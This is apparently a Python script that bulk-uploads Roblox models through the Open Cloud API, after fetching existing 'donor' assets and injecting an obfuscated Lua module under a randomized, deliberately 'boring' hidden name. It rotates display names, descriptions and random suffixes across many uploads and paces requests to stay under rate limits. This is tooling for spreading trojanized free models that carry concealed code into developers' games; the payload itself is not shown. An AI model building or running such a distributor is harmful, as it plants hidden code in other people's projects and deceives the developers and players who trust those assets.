import os
import json
import time
import random
import string
import requests
from pathlib import Path

from fetch_donor import (
    fetch_donor_rbxmx,
    inject_into_rbxmx,
    mutate_root_name,
    obfuscate_source,
)

OPEN_CLOUD_BASE = "https://apis.roblox.com/assets/v1/assets"
OPERATION_POLL  = "https://apis.roblox.com/assets/v1/{path}"

API_KEY = os.environ["ROBLOX_API_KEY"]
USER_ID = os.environ["ROBLOX_USER_ID"]

ROOT        = Path(__file__).parent.parent
config      = json.loads((ROOT / "config.json").read_text())
lua_source  = (ROOT / "module" / "Zegma.lua").read_text()

HEADERS = {"x-api-key": API_KEY}


def random_suffix(n: int = 6) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def build_creator() -> dict:
    if config["creator_type"] == "Group" and config.get("group_id"):
        return {"groupId": str(config["group_id"])}
    return {"userId": str(USER_ID)}


def build_fallback_rbxmx(name: str, source: str) -> str:
    return f"""<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:noNamespaceSchemaLocation="http://www.roblox.com/roblox.xsd"
    version="4">
  <Item class="ModuleScript" referent="RBX0001">
    <Properties>
      <string name="Name">{name}</string>
      <ProtectedString name="Source"><![CDATA[{source}]]></ProtectedString>
    </Properties>
  </Item>
</roblox>"""


def poll_operation(op_path: str, retries: int = 24, delay: float = 3.0) -> dict | None:
    url = f"https://apis.roblox.com/{op_path}"
    for _ in range(retries):
        r = requests.get(url, headers=HEADERS, timeout=15)
        if r.status_code == 200:
            data = r.json()
            if data.get("done"):
                return data.get("response", data)
        time.sleep(delay)
    return None


def upload_asset(display_name: str, description: str, rbxmx: str) -> dict | None:
    request_body = json.dumps({
        "assetType":   "Model",
        "displayName": display_name,
        "description": description,
        "creationContext": {
            "creator":       build_creator(),
            "expectedPrice": 0,
        },
    })

    files = {
        "request":     (None,            request_body,       "application/json"),
        "fileContent": ("model.rbxmx",   rbxmx.encode(),     "model/vnd.roblox+xml"),
    }

    r = requests.post(OPEN_CLOUD_BASE, headers=HEADERS, files=files, timeout=30)

    if r.status_code not in (200, 202):
        print(f"    [!] HTTP {r.status_code}: {r.text[:200]}")
        return None

    data     = r.json()
    op_path  = data.get("path") or data.get("operationPath")

    if op_path:
        print(f"    [~] Async op — polling: {op_path}")
        return poll_operation(op_path)

    return data


def run():
    names        = config["name_variants"]
    descs        = config["asset_description_variants"]
    donors       = config["donor_asset_ids"]
    bulk_count   = config["bulk_count"]
    results      = []

    obfuscated_source = obfuscate_source(lua_source)

    print(f"[*] Bulk upload starting — {bulk_count} assets\n")

    for i in range(bulk_count):
        suffix       = random_suffix()
        base_name    = names[i % len(names)]
        display_name = f"{base_name}_{suffix}"
        description  = descs[i % len(descs)]
        donor_id     = donors[i % len(donors)]
        # hidden module name inside the rbxmx tree — keep it boring
        inject_name  = f"_{random_suffix(4)}"

        print(f"  [{i+1}/{bulk_count}] {display_name}")
        print(f"    donor asset id: {donor_id}")

        # --- pull donor ---
        donor_rbxmx = fetch_donor_rbxmx(donor_id)

        if donor_rbxmx:
            rbxmx = inject_into_rbxmx(donor_rbxmx, obfuscated_source, inject_name)
            rbxmx = mutate_root_name(rbxmx, display_name)
            print(f"    [+] Donor fetched and injected")
        else:
            # fallback: bare module with our source, no donor shell
            rbxmx = build_fallback_rbxmx(display_name, obfuscated_source)
            print(f"    [~] Fallback rbxmx (no donor)")

        result = upload_asset(display_name, description, rbxmx)

        if result:
            asset_id = (result.get("assetId")
                        or result.get("response", {}).get("assetId")
                        or "pending")
            print(f"    [+] Uploaded — asset id: {asset_id}\n")
            results.append({"name": display_name, "asset_id": asset_id, "donor": donor_id})
        else:
            print(f"    [-] Failed\n")
            results.append({"name": display_name, "asset_id": None, "donor": donor_id})

        # stay under open cloud rate limit (~60/min)
        time.sleep(1.2)

    out = ROOT / "upload_results.json"
    out.write_text(json.dumps(results, indent=2))

    success = sum(1 for r in results if r["asset_id"])
    print(f"[*] Done — {success}/{bulk_count} successful")
    print(f"[*] Results: {out}")


if __name__ == "__main__":
    run()
